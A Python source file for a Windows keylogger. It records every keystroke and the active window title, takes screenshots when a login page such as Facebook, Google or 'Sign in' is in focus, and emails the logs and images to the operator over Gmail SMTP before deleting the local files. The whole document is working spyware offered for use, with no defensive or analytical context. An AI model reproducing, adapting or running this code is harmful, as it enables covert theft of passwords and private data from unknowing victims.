from threading import Timer
from threading import Thread
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import subprocess, socket, base64, time, datetime, os, sys, urllib2, platform
import pythoncom, pyHook, Image, ImageGrab, win32api, win32gui, win32con, smtplib

#KEYLOGGER settings
###############
#Email settings
LOG_SENDMAIL = True
LOG_MAIL = ' '   #Your email id and
LOG_PASS = ' '   #password go here
LOG_FROM = 'farzi@log.com'
LOG_SUBJ = 'Check this out'
LOG_MSG = 'Welcome to the world of Espionage'
###########

#Screenshot settings
LOG_SCREENSHOT = True
LOG_SCREENSNUM = 3
LOG_INTERVAL = 2
LOG_SCREEN = []
LOG_SCREEN.append("Facebook")
LOG_SCREEN.append("Sign in")
LOG_SCREEN.append("Google")
##

#System Settings
LOG_FILENAME = 'temp.txt'
LOG_TOSEND = []
LOG_ACTIVE = ''
LOG_STATE = False
LOG_TIME = 30		#The amount of time to log, where 0 = infinite and 60 = 1 minute
LOG_TEXT = ""
LOG_TEXTSIZE = 0
LOG_MINTERVAL = 60		#main loop interval in seconds; how often do you want the email to be sent
LOG_THREAD_kl = 0
LOG_THREAD_ss = 0
#

main_thread_id = win32api.GetCurrentThreadId()

def Keylog(k, LOG_TIME, LOG_FILENAME):
	if os.name != 'nt': return "Not supported for this operating system"
	global LOG_TEXT, LOG_FILE, LOG_STATE, LOG_ACTIVE, main_thread_id
	LOG_STATE = True 
	#logging begins
	main_thread_id = win32api.GetCurrentThreadId()
	#adding the timing
	LOG_TEXT += "\n==========================================\n"
	LOG_DATE = datetime.datetime.now()
	LOG_TEXT += ' ' + str(LOG_DATE) + ' >>>> Logging started .. \\n'
	LOG_TEXT += "===============================================\n\n"
	#finding out the currently active window
	w = win32gui
	LOG_ACTIVE = w.GetWindowText(w.GetForegroundWindow())
	LOG_DATE = datetime.datetime.now()
	LOG_TEXT += "[*] New Window Opened. [" + str(LOG_DATE) + "] \n"
	LOG_TEXT += "=" * len(LOG_ACTIVE) + "===\n"
	LOG_TEXT += LOG_ACTIVE + " |\n"
	LOG_TEXT += "=" * len(LOG_ACTIVE) + "===\n\n"
	if LOG_TIME > 0:
		t = Timer(LOG_TIME, stopKeylog) #QUIT
		t.start()
	#open file to write
	LOG_FILE = open(LOG_FILENAME, 'w')
	LOG_FILE.write(LOG_TEXT)
	LOG_FILE.close()
	hm = pyHook.HookManager()
	hm.KeyDown = OnKeyboardEvent
	hm.HookKeyboard()
	pythoncom.PumpMessages() #the real magic happens here
	LOG_FILE = open(LOG_FILENAME, 'a')
	LOG_TEXT += "\n\n=============================================================\n"
	LOG_DATE = datetime.datetime.now()
	LOG_TEXT += " " + str(LOG_DATE) + ' >>>> Logging Finished. |\n'
	LOG_TEXT += "===============================================================\n"
	LOG_STATE = False
	try:
		LOG_FILE.write(LOG_TEXT)
		LOG_FILE.close()
	except:
		LOG_FILE.close()
	return True
	
#function to stop the keylogger
def stopKeylog():
	win32api.PostThreadMessage(main_thread_id, win32con.WM_QUIT, 0, 0);

#function to actually record the strokes
def OnKeyboardEvent(event):
	global LOG_STATE, LOG_THREAD_ss
	if LOG_STATE == False: return True
	global LOG_TEXT, LOG_FILE, LOG_FILENAME, LOG_ACTIVE, LOG_INTERVAL
	global LOG_SCREENSHOT, LOG_SCREENSNUM
	LOG_TEXT = ""
	LOG_FILE = open(LOG_FILENAME, 'a')
	
	#checking for new window activation

	wg = win32gui
	LOG_NEWACTIVE = wg.GetWindowText (wg.GetForegroundWindow())
	if LOG_NEWACTIVE != LOG_ACTIVE:
		#record this session as well
		LOG_DATE = datetime.datetime.now()
		LOG_TEXT += "\n\n[*] Window Activated. [" + str(LOG_DATE) + "] \n"
		LOG_TEXT += "=" * len(LOG_NEWACTIVE) + "===\n"
		LOG_TEXT += " " + LOG_NEWACTIVE + " |\n"
		LOG_TEXT += "=" * len(LOG_NEWACTIVE) + "===\n\n"
		LOG_ACTIVE = LOG_NEWACTIVE
		#taking screenshots while logging
		if LOG_SCREENSHOT == True:
			LOG_IMG = 0
			while LOG_IMG < len(LOG_SCREEN):
				if LOG_NEWACTIVE.find(LOG_SCREEN[LOG_IMG]) > 0 :
					LOG_TEXT += "[*] Taking " + str(LOG_SCREENSNUM) + " screenshot for \"" + LOG_SCREEN[LOG_IMG] + "\" match.\n"	
					LOG_TEXT += "[*] Timestamp : " + str(datetime.datetime.now()) + "\n\n"
					ss = Thread(target=takeScreenshots, args = (LOG_THREAD_ss,LOG_SCREENSNUM, LOG_INTERVAL))
					ss.start()
					LOG_THREAD_ss += 1
				LOG_IMG += 1
		LOG_FILE.write(LOG_TEXT)
		
		LOG_FILE.write(LOG_TEXT)
	
	LOG_TEXT = ""
	if event.Ascii == 8 : LOG_TEXT += "\b"
	elif event.Ascii == 13 or event.Ascii == 9 : LOG_TEXT += "\n"
	else: LOG_TEXT += str(chr(event.Ascii))
	#write to the file
	LOG_FILE.write(LOG_TEXT)
	LOG_FILE.close()
	
	return True
	
#screenshot function
def Screenshot():
	img=ImageGrab.grab()
	saveas=os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S')+'.png')
	img.save(saveas)
	if LOG_SENDMAIL == True:
		addFile = str(os.getcwd()) + "\\" + str(saveas)
		LOG_TOSEND.append(addFile) 
		
#taking multiple screenshots function
def takeScreenshots(i, maxShots, intShots):
	shot = 0
	while shot < maxShots:
		shottime = time.strftime('%Y_%m_%d_%H_%M_%S')
		Screenshot()
		time.sleep(intShots)
		shot += 1

#sending the email
#the function goes here

def sendEmail():
	msg = MIMEMultipart()
	msg['Subject'] = LOG_SUBJ
	msg['From'] = LOG_FROM
	msg['To'] = LOG_MAIL
	msg.preamble = LOG_MSG
	#attach each file
	for file in LOG_TOSEND:
		#attaching the text file
		if file[-4:] == '.txt':
			fp = open(file)
			attach = MIMEText(fp.read())
			fp.close()
		#attaching the images
		elif file[-4:] == '.png':
			fp = open(file, 'rb')
			attach = MIMEImage(fp.read())
			fp.close()
		attach.add_header('Content Disposition', 'attachment; filename = "%s"' % os.path.basename(file))
		msg.attach(attach)
		
	
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	server.login(LOG_MAIL, LOG_PASS)
	server.sendmail(LOG_FROM, LOG_MAIL, msg.as_string())
	server.quit()

#function to clean up fields
def deleteFiles():
		if len(LOG_TOSEND) < 1 : return True
		for file in LOG_TOSEND:
			os.unlink(file)
			
#start the keylogging
kl = Thread(target=Keylog, args=(LOG_THREAD_kl, LOG_TIME, LOG_FILENAME))
kl.start()

#if keylogging runs infinitely
if LOG_TIME < 1:
	while True:
		time.sleep(LOG_MINTERVAL)
		LOG_NEWFILE = time.strftime('%Y_%m_%d_%H_%M_%S') + ".txt"
		if LOG_SENDMAIL == True:
			addFile = str(os.getcwd()) + "\\" + str(LOG_NEWFILE)
			LOG_TOSEND.append(addFile)
		
		LOG_SAVEFILE = open(LOG_NEWFILE, 'w')
		LOG_CHCKSIZE = open(LOG_FILENAME, 'r')
		LOG_SAVEFILE.write(LOG_CHCKSIZE.read())
		LOG_CHCKSIZE.close()
		try:
			LOG_SAVEFILE.write(LOG_SAVETEXT)
			LOG_SAVEFILE.close()
		except:
			LOG_SAVEFILE.close()
			
		if LOG_SENDMAIL == True:
			sendEmail()
			time.sleep(5)
			deleteFiles()
		LOG_TOSEND = [] #to clear the list
	
#otherwise sleep for specified time, then break the program
elif LOG_TIME > 0:
	time.sleep(LOG_TIME)
	if LOG_SENDMAIL == True: sendEmail()
	time.sleep(5)
